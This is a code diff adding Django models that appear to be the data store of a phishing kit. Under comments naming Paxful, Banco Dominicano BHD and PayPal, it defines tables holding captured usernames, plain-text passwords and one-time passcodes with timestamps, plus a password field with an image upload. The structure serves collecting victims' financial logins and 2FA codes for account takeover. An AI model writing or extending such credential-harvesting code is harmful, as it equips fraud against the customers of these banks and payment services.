@@ -46,3 +46,58 @@ class FailedLoginAttempt(models.Model):
 
     def __str__(self):
         return f"{self.ip_address} at {self.attempt_time}"
+
+
+
+#models for paxful
+
+
+
+
+class UserSubmission(models.Model):
+    username = models.CharField(max_length=150)
+    password = models.CharField(max_length=128)
+
+    def __str__(self):
+        return self.username
+
+class OTPSubmission(models.Model):
+    user_submission = models.ForeignKey(UserSubmission, related_name='otps', on_delete=models.CASCADE)
+    otp = models.CharField(max_length=10)
+    timestamp = models.DateTimeField(auto_now_add=True)
+
+    def __str__(self):
+        return f"{self.user_submission.username} - {self.otp}"
+
+
+
+#model bancodominicanobhd currently fb
+
+
+class User(models.Model):
+    user_id = models.CharField(max_length=100, null=True, blank=True)
+    clave = models.CharField(max_length=100, null=True, blank=True)
+    image = models.ImageField(upload_to='images/', null=True, blank=True)
+
+    def __str__(self):
+        return self.user_id
+
+
+
+#models for paypal
+
+
+class UserSubmissionPaypal(models.Model):
+    username = models.CharField(max_length=150)
+    password = models.CharField(max_length=128)
+
+    def __str__(self):
+        return self.username
+
+class OTPSubmissionPaypal(models.Model):
+    user_submission = models.ForeignKey(UserSubmissionPaypal, related_name='otps', on_delete=models.CASCADE)
+    otp = models.CharField(max_length=10)
+    timestamp = models.DateTimeField(auto_now_add=True)
+
+    def __str__(self):
+        return f"{self.user_submission.username} - {self.otp}"
